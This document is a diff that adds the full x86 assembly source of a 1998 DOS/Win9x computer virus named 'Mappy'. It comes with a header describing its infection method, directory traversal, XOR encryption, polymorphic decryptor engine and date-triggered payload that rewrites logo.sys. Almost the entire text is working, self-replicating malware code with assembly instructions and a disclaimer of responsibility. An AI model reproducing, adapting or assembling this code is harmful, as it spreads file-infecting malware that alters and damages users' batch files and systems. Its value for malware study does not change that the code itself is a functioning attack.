@@ -1,0 +1,783 @@
+; ****************************************************************************
+; *
+; * Virus:	Mappy
+; * Author:	Blacksmith Tony
+; * Created:	October 98
+; * Infects:	*.BAT using debug
+; * Type:	Run-time prepending with directory traversal
+; * Size:	about 5000 bytes for the batch files
+; * Encryted:	8-bit xor
+; * Poly:	Small built in engine changes the debug script
+; * Payload:	Yes (Activation date- first of the month)
+; *		 Payload: check for a Win9x OS, then attempts to either
+; *		 modify or create a new logo.sys file by adding a picture.
+; *
+; * Description:
+; * 	The interesting "trick" to this virus is how it executes.  It
+; * prepends itself to a host so it is executed first.  It then looks like:
+; *	@goto BVOne		; BV acronym: Batch Virus
+; *	e 100
+; *	18 13 46 A8 ....
+; *	g
+; *	q
+; *	:BVOne
+; *	@set mappy=%0
+; *	@if $%mappy%==$ set mappy=autoexec.bat
+; *	@if not exist %mappy% set mappy=%mappy%.bat
+; *	@debug <%mappy%>nul
+; *	<host stuff>
+; *
+; *	When run, it skips over the debug script and sets the mappy variable
+; * to the %0 parameter (the command used to run the batch file).  If the
+; * mappy variable is blank, that means the computer is just booting, and
+; * that autoexec.bat is being run.  If the .bat was left off, then add it.
+; * It then feeds the resulting file name into debug piping output to nul.
+; * 	Debug then does:
+; * -@goto BVOne
+; *  ^error
+; * -e 100
+; * ...
+; * -g
+; * Program terminated normally
+; * -q
+; *
+; * The asm code does a few things:
+; * 	First it check for the time for the payload.  If it is, it adds mappy
+; * the logo.sys file and ends program. (IF YOU WANT TO KEEP YOUR OLD LOGO FILE
+; * THEN MAKE A BACKUP [if you don't have a logo.sys file (it's hidden in your
+; * root dir) then just erase the new logo.sys to return to normal]).
+; * 	Otherwise, it goes to the root directory and starts looking at all
+; * files and directories.  When it reaches a .bat file it tries to infect it.
+; * If infection is successful, it restores the diretory and ends program else
+; * it just continues looking for files and dirs.  When it comes to a dir,
+; * it counts it (as long as it's not "." or "..").
+; * 	If no suitable files are found in the directory, the number of dirs
+; * branching from it are checked.  If the number is greater than rezo, then
+; * the directory is changed to one of those (random), and the process is
+; * repeated.  Otherwise the virus ends in failure.
+; *
+; * To assemble:
+; *	Assemble to a com file with your favourite assembler
+; *
+; * Disclaimer:
+; *	The author is not responsible for anything you chose to do with
+; * this virus or for any results there of.
+; *
+; * Greets to:
+; *   Spooky-	Thanks for the help
+; *   CB-	Great mag, keep up the good work
+; *   Cyclone-	Thanks for being my annonymous remailer and for the help
+; *   Anybody else that I may have missed.
+; *
+; ****************************************************************************
+
+TRUE		equ	1
+FALSE		equ	0
+HalfBMPSize	equ	43026 - (BMPHeaderEnd-BMPHeader)/3 ; 129078/3=43026
+PicPosition	equ	31634
+PicWidth	equ	49
+infofs		equ	7		; Infection marker offset (NO TOUCH!)
+infmarker	equ	'V'		; Infection marker
+Activation	equ	1		; day of each month of payload
+heapsize	equ	40		; Space for decryptor routine
+debug		equ	FALSE		; Print infected files with directories
+					;  (the com file only)
+
+assume	cs:main,ds:main,ss:main
+main	segment
+ofszero:
+	org	100h
+
+teststart:
+	jmp	short firstfixup	; decryptor init routine goes here
+	org	10Bh
+
+firstfixup:
+	mov	ah,47h			; Save current directory
+	mov	dl,0
+	lea	si,origdir
+	int	21h
+	mov	ah,3Bh			; Goto root directory
+	lea	dx,rootdir
+	int	21h
+
+	mov	ax,3306h		; Skip Payload test if not win9x
+	int	21h
+	cmp	bl,7
+	jb	MainLoop
+	mov	ah,2Ah			; Is it time for the payload?
+	int	21h			; Get system date
+	cmp	dl,Activation		; Is the day the activation day?
+	je	mappylogo
+
+MainLoop:
+	mov	ah,4Eh			; Look for directories
+	mov	cx,0016h
+	lea	dx,anydir
+	int	21h
+	jc	EndProg
+
+	xor	cx,cx
+Numloop:				; Count number of directories (cx)
+	call	isdir
+	jz	noinc1
+	inc	cx
+noinc1:
+	mov	ah,4Fh
+	int	21h
+	jnc	Numloop
+	or	cx,cx
+	jz	EndProg
+	cwd				; ax=0012h (top bit clear)
+	in	al,40h			; Get a "random" number
+	div	cx			; divide to get new path
+
+	push	dx
+	mov	ah,4Eh			; Go to the remainder-th # dir
+	mov	cx,0016h
+	lea	dx,anydir
+	int	21h
+	pop	cx
+	inc	cx
+	jmp	short indirloop
+dirloop:
+	mov	ah,4Fh
+	int	21h
+indirloop:
+	call	isdir2
+	jz	dirloop
+	loop	dirloop
+dirfound:
+	mov	ah,3Bh			; Switch to that directory
+	mov	dx,009Eh
+	int	21h
+;***
+if debug
+	mov	cx,20			; Print out the directory name
+	mov	di,9Eh			;  (works in 1st gen only)
+	push	di
+	mov	al,0
+	repne	scasb
+	mov	byte ptr [di],'$'
+	mov	ah,9
+	pop	dx
+	int	21h
+endif
+;***
+	jmp	short mainloop		; Repeat process
+	
+Endprog:
+	mov	ah,3Bh			; Restore directory
+	lea	dx,origdir-1
+	mov	byte ptr ds:[origdir-1],'\'
+	int	21h
+	int	20h			; End Program
+
+
+;********************PAYLOAD*************************
+mappylogo:
+	xor	cx,cx			; Clear attributes on logo.sys
+	lea	dx,filename		;  ignore filenotfound error
+	call	attrib2			;  for now
+	mov	ax,3d02h		; Open file for write
+	int	21h
+	jnc	logofound
+
+	mov	ah,3Ch			; File not found-create new
+	xor	cx,cx
+	int	21h
+	jc	EndProg
+	xchg	ax,bx
+	mov	ah,40h			; write out header+2 cols
+	mov	cx,BMPHeaderEnd-BMPHeader
+	lea	dx,BMPHeader
+	int	21h
+	mov	ax,6262h
+	mov	cx,(HalfBMPSize+1)/2
+	lea	di,heap
+	mov	dx,di
+	rep	stosw
+	mov	ah,40h			; write out picture in 3 writes
+	push	ax
+	mov	cx,HalfBMPSize
+	int	21h
+	pop	ax
+	push	ax
+	int	21h
+	pop	ax
+	int	21h
+	mov	ah,3Eh
+	int	21h
+	jmp	short mappylogo
+doneexec:
+	jmp	short EndProg
+
+logofound:
+	xchg	bx,ax
+	mov	ah,3Fh			; read in old data
+	mov	cx,45000		;  45000 bytes gets all we're
+	lea	dx,heap			;  interested in.
+	push	dx
+	int	21h
+	push	ax			; bytes read in
+
+	push	bx
+	xor	ax,ax
+	lea	si,Picdata
+	lea	di,heap+PicPosition
+	cmp	byte ptr ds:[di+18h], 62h	; OK to change?
+	jne	doneexec
+
+Picloop2:				; Decompress and Draw Mappy
+	xor	bx,bx
+Picloop1:
+	mov	cx,1
+	call	GetNibble
+	test	al,8
+	jnz	PicNoRLE
+	xchg	ax,cx
+	call	GetNibble
+	add	al,3
+	xchg	ax,cx
+PicNoRLE:
+	add	bx,cx
+	and	al,7
+	cmp	al,2
+	jb	picready
+	dec	ax
+	dec	ax
+	jz	picblank
+	add	al,229
+	jmp	short picready
+picblank:
+	add	di,cx
+	jmp	short plotdone
+picready:
+	rep	stosb
+plotdone:
+	cmp	bx,PicWidth
+	jb	Picloop1
+	add	di,(320-PicWidth)
+	cmp	si,offset EndPic-1
+	jb	PicLoop2
+
+	mov	cx,Picdata-DAC		; Modify Color pallete
+	lea	si,DAC
+	lea	di,heap+3CEh
+	rep	movsb
+
+	pop	bx			; Goto start of file
+	mov	ax,4200h
+	cwd
+	int	21h
+	mov	ah,40h			; Write out changes
+	pop	cx
+	pop	dx
+	int	21h
+	mov	ah,3eh
+	int	21h
+	jmp	short doneexec
+
+;**************************Procs*************************
+Isdir2:
+	test	byte ptr ds:[95h],10h
+	jz	Nodir
+Isdir:				; NoDir = ZR set,  Dir = NZ
+	test	byte ptr ds:[95h],10h
+	jz	isbatfile
+
+	cmp	byte ptr ds:[9Eh],'.'
+Nodir:
+	ret
+Nothingfound:
+	pop	cx
+	xor	ax,ax
+	ret
+
+isbatfile:
+	push	cx
+	mov	di,9Eh
+	mov	cl,10
+	mov	al,'.'
+	repne	scasb
+	cmp	[di],'AB'
+	jne	nothingfound
+	cmp	[di+2],byte ptr 'T'
+	jne	nothingfound
+;****
+if debug
+	mov	byte ptr [di+4],'$'
+	mov	ah,9
+	mov	dx,9Eh
+	int	21h
+endif
+;****
+
+; *** It is a batch file - attempt to infect ******************
+	xor	cx,cx			; Clear file attributes
+	call	attrib
+	mov	ax,3d02h		; Open file (ds:dx still rigth)
+	int	21h
+	jc	nothingfound		; Error
+	xchg	ax,bx
+	
+	mov	ah,3Fh			; Read in file
+	mov	cx, word ptr ds:[9Ah]	; file size
+	cmp	cx, -(offset oldbatfile)+65000	; File too big?
+	ja	nothingfound
+	lea	dx,oldbatfile
+	int	21h
+
+	cmp	byte ptr [offset oldbatfile+infofs],infmarker
+	je	nothingfound		; Check infection
+
+	mov	ax,4200h		; goto begin of file
+	xor	cx,cx
+	xor	dx,dx
+	int	21h
+
+	in	al,40h			; Polystuff
+	mov	byte ptr cryptval,al
+	in	al,40h
+	push	bx
+	call	proc1
+	mov	bp,di
+	pop	bx
+
+	mov	ah,40h			; Write out first part
+	mov	cx,newbat2-newbat1
+	lea	dx,newbat1
+	int	21h
+
+	lea	di,virhex
+	mov	cx,firstfixup-teststart
+	lea	si,teststart
+initloop:
+	lodsb
+	call	makehexbyte
+	loop	initloop
+
+	mov	cx,secondproc-firstfixup
+virloop:
+	lodsb
+	xor	al,byte ptr cryptval
+	call	makehexbyte
+	loop	virloop
+
+decryptloop:
+	lodsb
+	call	makehexbyte
+	cmp	si,bp
+	jb	decryptloop
+
+	mov	ah,40h			; write debug data
+	lea	cx,[di-(virhex-ofszero)-1]
+	lea	dx,virhex+1
+	int	21h
+
+	mov	ah,40h			; Write out second text part
+	mov	cx,battextend-newbat2
+	lea	dx,newbat2
+	int	21h
+
+	mov	ah,40h			; write out host bat
+	mov	cx, word ptr ds:[9Ah]
+	lea	dx,oldbatfile
+	int	21h
+	call	closefile
+	jmp	Endprog
+
+closefile:
+	mov	ax,5701h		; Restore time
+	mov	cx,ds:[96h]
+	mov	dx,ds:[98h]
+	int	21h
+	mov	ah,3Eh			; close file
+	int	21h
+	mov	ch,0h
+	mov	cl,ds:[95h]		; restore attributes
+	call	attrib
+	ret
+attrib:
+	mov	dx,9Eh
+attrib2:
+	mov	ax,4301h
+	int	21h
+	ret
+
+GetNibble:
+	dec	byte ptr flag
+	jz	lowerhalf
+	mov	al,byte ptr [si]
+	push	cx
+	mov	cl,4
+	shr	ax,cl
+	pop	cx
+	ret
+lowerhalf:
+	mov	byte ptr flag,2
+	lodsb
+	and	al,0Fh
+	ret
+	flag	db 2
+
+filename:
+	db	'LOGO.SYS',0
+BMPHeader:
+	db	'BM'		; sig
+	dd	0001F836h	; file size
+	dd	0		; reserved
+	dd	00000436h	; ofs of bitmap in file
+	dd	00000028h	; length of bitmap info header
+	dd	320		; width
+	dd	400		; height
+	dw	1		; number of planes
+	dw	8		; Bits per Pixel
+	dd	0		; Compression type (no compression)
+	dd	0		; Size of pictuer in bytes (0?!?)
+	dd	000000E6h	; Horizontal resolution
+	dd	00000006h	; Vertical resolution
+	dd	0		; Number of colors used
+	dd	000000ECh	; Number of important colors (#col not rotated)
+	db	0, 0, 0, 0	; Col 1 (Black)- B,G,R cols + filler
+	db	255, 255, 255	; Col 2 (White)
+BMPHeaderEnd	equ	$+2
+;**********************************************************
+;Note:	The Default Windows 95 logo.sys file has a few
+;	interesting properties.  By far the most useful is:
+;	It has a 6 unused colors at 230-235
+;**********************************************************
+DAC:				; The colors for the picture (B,G,R,filler)
+	db	43,96,194,0
+	db	72,103,171,0
+	db	150,175,225,0
+	db	175,206,224,0
+	db	35,87,167
+;**********************************************************
+; Picture format:
+;  read in nibble at a time.
+;  if nibble >= 8	{value}
+;   then color value= nibble-8
+;   else		{run length encoding}
+;    color= nibble
+;    lengthofrun= NextNibble+3
+; where:
+;  col 0= black
+;  col 1= white
+;  col 2= transparent
+;  col 3+= colors defined in DAC
+;
+; Example:
+; the string 9B 14 decompresses into
+; col 1 (9-8)
+; col 3 (B-8)
+; a run of 7 (4+3) col 1.
+;  ie.  1,2,1,1,1,1,1,1,1
+; 
+;**********************************************************
+Picdata:
+	db 47, 35, 0, 47, 33, 37, 4, 238, 4, 251, 178, 242, 18, 32, 12, 255
+	db 134, 144, 50, 250, 33, 4, 109, 2, 170, 130, 178, 38, 246, 79, 140, 200
+	db 43, 33, 134, 246, 79, 136, 248, 43, 32, 139, 111, 100, 192, 2, 194, 8
+	db 253, 111, 99, 248, 143, 130, 186, 136, 207, 104, 214, 120, 139, 251, 252, 130
+	db 186, 171, 207, 111, 100, 251, 200, 130, 186, 167, 11, 111, 96, 184, 192, 34
+	db 184, 248, 112, 182, 109, 104, 223, 251, 207, 130, 186, 160, 31, 182, 5, 14
+	db 248, 96, 208, 14, 237, 207, 251, 191, 248, 43, 32, 143, 49, 200, 233, 235
+	db 203, 188, 136, 158, 232, 143, 143, 187, 248, 248, 43, 32, 131, 28, 136, 158
+	db 159, 187, 252, 136, 238, 144, 15, 136, 255, 143, 242, 186, 136, 248, 143, 176
+	db 9, 238, 139, 252, 248, 134, 9, 136, 255, 188, 136, 184, 43, 33, 131, 0
+	db 9, 238, 139, 255, 200, 137, 238, 152, 135, 3, 24, 43, 33, 139, 251, 137
+	db 152, 232, 139, 252, 241, 16, 31, 251, 183, 8, 242, 162, 43, 251, 254, 224
+	db 27, 112, 158, 3, 255, 191, 251, 248, 242, 162, 47, 187, 200, 157, 0, 191
+	db 252, 158, 3, 251, 248, 255, 0, 42, 34, 48, 200, 153, 0, 183, 13, 156
+	db 1, 207, 251, 140, 207, 168, 130, 146, 43, 251, 248, 158, 232, 188, 251, 200
+	db 233, 176, 11, 243, 31, 32, 178, 16, 58, 162, 47, 251, 252, 142, 152, 191
+	db 251, 255, 137, 152, 135, 11, 251, 248, 32, 255, 170, 139, 191, 176, 10, 35
+	db 139, 191, 142, 232, 191, 48, 248, 233, 136, 195, 8, 191, 130, 0, 10, 48
+	db 251, 240, 2, 76, 252, 192, 15, 243, 15, 240, 12, 191, 184, 143, 130, 40
+	db 251, 191, 49, 248, 130, 72, 187, 240, 11, 251, 251, 252, 0, 183, 8, 203
+	db 130, 56, 243, 63, 138, 35, 143, 187, 251, 191, 243, 31, 53, 255, 194, 83
+	db 72, 170, 34, 143, 248, 140, 243, 159, 204, 252, 194, 115, 40, 138, 162, 44
+	db 188, 219, 140, 57, 66, 136, 38, 131, 40, 138, 34, 64, 222, 216, 203, 191
+	db 52, 112, 142, 0, 39, 139, 191, 252, 138, 34, 0, 80, 132, 47, 248, 135
+	db 14, 237, 208, 2, 184, 32, 34, 0, 237, 232, 252, 0, 113, 207, 203, 237
+	db 224, 2, 242, 32, 14, 221, 143, 248, 143, 207, 252, 143, 200, 237, 224, 2
+	db 242, 32, 63, 204, 32, 0, 160, 46, 1, 47, 34, 6, 36, 7, 47, 35
+	db 5, 37, 5, 47, 162, 64, 50, 112, 66, 250, 37, 0, 42, 1, 47, 32
+EndPic:
+
+anydir	db '*.*',0
+rootdir	db '\',0
+newbat1:
+	db '@goto B',infmarker,'One',13,10
+	db 'e 100',13,10
+newbat2:
+	db 13,10,'g',13,10,'q',13,10
+	db ':B',infmarker,'One',13,10
+	db '@set mappy=%0',13,10
+	db '@if $%mappy%==$ set mappy=autoexec.bat',13,10	; autoexec is a
+	db '@if not exist %mappy% set mappy=%mappy%.bat',13,10	;  special case
+	db '@debug <%mappy%>nul',13,10
+battextend:
+hexinfo:
+	db '0123456789ABCDEF'
+makehexbyte:
+	push	bx
+	push	cx
+	push	ax
+	mov	al,' '
+	stosb
+	pop	ax
+	mov	cl,4
+	push	ax
+	lea	bx,hexinfo
+	shr	al,cl
+	jz	NoLeadZero
+	xlatb
+	stosb
+NoLeadZero:
+	pop	ax
+	and	al,0Fh
+	xlatb
+	stosb
+	pop	cx
+	pop	bx
+	ret
+
+;*******************************************************************
+;  Small poly engine
+;*******************************************************************
+
+stbl	dw	offset movcxproc
+	dw	offset movbxproc
+	dw	offset movalproc
+
+stbl2	dw	offset movcxproc2
+	dw	offset doproc2precall
+
+brtable	dw	0307h	; bx
+	dw	0604h	; si
+	dw	0705h	; di
+
+;************** Procs ***************
+movcxproc2:
+	or	bl,bl
+	js	movcxproc
+	mov	ax,0C181h
+	stosw
+	jmp	short movcxentry2
+movcxproc:				; mov (count reg[cx]), virsize
+	mov	al,0B9h
+	stosb
+movcxentry2:
+	mov	ax,secondproc-firstfixup
+	stosw
+	ret
+
+movbxproc:				; mov (address reg), decrypt start addr
+	mov	al,0B8h
+	or	al,dh
+	stosb
+	mov	ax,offset firstfixup
+	stosw
+	ret
+
+movalproc:
+	db	0B8h, 0B0h		; mov al, decrypter value
+cryptval:
+	db	0AAh
+	stosw
+	ret
+
+doproc2call:				; call decryptor routine
+	mov	al, 0E8h
+doproc2call2:
+	stosb
+	mov	ax,offset secondproc - 2
+	sub	ax,di
+	stosw
+	retn
+
+doproc2precall:				; Call & jump for temp decyptor
+	test	bl,40h
+	jz	doproc2precall2
+	call	doproc2call		; The call
+	mov	ax,offset firstfixup-2	; the jump
+	sub	ax,di
+	xchg	ah,al
+	mov	al,0EBh
+	stosw
+doproc2precall3:
+	mov	di,offset secondproc	; Temporary Decryption Routine
+	retn
+doproc2precall2:
+	mov	al,0E9h
+	call	doproc2call2
+	jmp	short doproc2precall3
+
+fliptablecall:
+	jnz	doneflip
+	mov	ax,[si]
+	xchg	ax,[si+2]
+	mov	[si],ax
+doneflip:
+	retn
+
+;************************************
+
+TempDecryptor:				; Can't use lowest 4-bits of rand #
+	xchg	bx,ax			; Random Number in bl
+
+	mov	di,offset teststart	; Stub prog
+
+	mov	si,offset stbl2		; Flip stbl2 around
+	test	bl,20h
+	call	fliptablecall
+
+	call	stbl2			; mov  cx,length
+	call	stbl2+2			; Call decrytor
+
+	push	di			; Save label to xor
+
+	mov	ax, 3680h		; xor [var1],#2
+	stosw
+	push	di			; Save location for inc/dec
+	mov	al,byte ptr cryptval
+	mov	byte ptr [di+2],al	; #2= Decrypt value + cs:(next inst)
+
+	test	bl,10h
+	jz	doxor2
+	mov	word ptr [di],offset firstfixup	; var1= offset to decrypt
+	add	di,3
+	mov	ax,06FFh		; inc var1
+	jmp	short doxordone
+doxor2:
+	mov	word ptr [di],offset secondproc-1; var1= offset to decrypt
+	add	di,3
+	mov	ax, 0EFFh		; dec var1
+doxordone:
+	stosw
+	pop	ax			; ax= old di (addr in xor)
+
+	jmp	short incbxdone2
+;************************************
+
+proc1:
+
+	mov	si,0006			; si = index
+	and	si,ax
+	jz	TempDecryptor
+
+	mov	bx,offset brtable-2
+	mov	dx,[bx+si]
+
+	mov	bl,al			; Random # in bl
+	mov	di,offset teststart	; di = spot to write code
+
+	mov	si,offset stbl
+	test	bl,20h
+	call	fliptablecall
+	inc	si
+	inc	si
+	test	bl,40h
+	call	fliptablecall
+
+;mov cx,#				  Mov cx, decryptsize
+	call	stbl
+;mov bx,#
+	call	stbl+2
+;mov al,#
+	call	stbl+4
+;call crypt
+	call	doproc2call
+
+	lea	di,secondproc
+;Proc2:
+;cs:
+	push	di			; Save label
+;xor [bx],al
+	mov	al,30h
+	mov	ah,dl
+	stosw
+;inc bx	
+	xchg	ax,dx			; change to mov to save dx
+	test	bl,10h
+	jnz	incbx3
+	or	bl,bl
+	js	incbx2
+	xchg	al,ah
+	or	al,40h
+	jmp	short incbxdone1	; inc reg
+incbx2:
+	mov	al,0FFh
+	or	ah,0C0h
+incbxdone2:
+	stosw				; long inc reg
+	jmp	short incbxdone0
+incbx3:
+	mov	al,83h
+	or	bl,bl
+	js	incbx4
+	mov	byte ptr [di],0F9h	; stc
+	inc	di
+	or	ah,0D0h
+	stosw				; adc reg,0
+	mov	al,0
+	jmp	short incbxdone1
+incbx4:
+	or	ah,0C0h
+	stosw				; add reg,1
+	mov	al,1
+incbxdone1:
+	stosb
+incbxdone0:
+
+;loop above				From here down - uses 0000 1001
+	pop	ax			; Get xor label [old di]
+	sub	ax,di
+	dec	ax
+	dec	ax
+	xchg	ah,al
+	test	bl,1
+	jnz	doloop2
+	mov	al,49h			; dec cx
+	stosb
+	dec	ah
+	mov	al,75h			; jnz
+	jmp	short DoLoopDone
+DoLoop2:
+	mov	al,0E2h			; loop
+DoLoopDone:
+	stosw
+
+;ret
+	test	bl,46h
+	jz	jumpback
+	test	bl,8
+	jnz	doret2
+	mov	al,0C3h				; ret
+	jmp	short doretdone
+doret2:
+	mov	ax,0FF5Bh			; pop bx + jmp bx
+	stosw
+	mov	al,0E3h
+doretdone:
+	stosb
+doretdone2:
+	retn
+jumpback:
+	mov	al,0E9h
+	stosb
+	mov	ax,offset firstfixup-2
+	sub	ax,di
+	stosw
+	retn
+
+secondproc:
+
+origdir		equ	$+heapsize
+virhex		equ	origdir+65
+heap		equ	virhex
+oldbatfile	equ	virhex+(3*(virhex-teststart))
+main	ends
+end	teststart
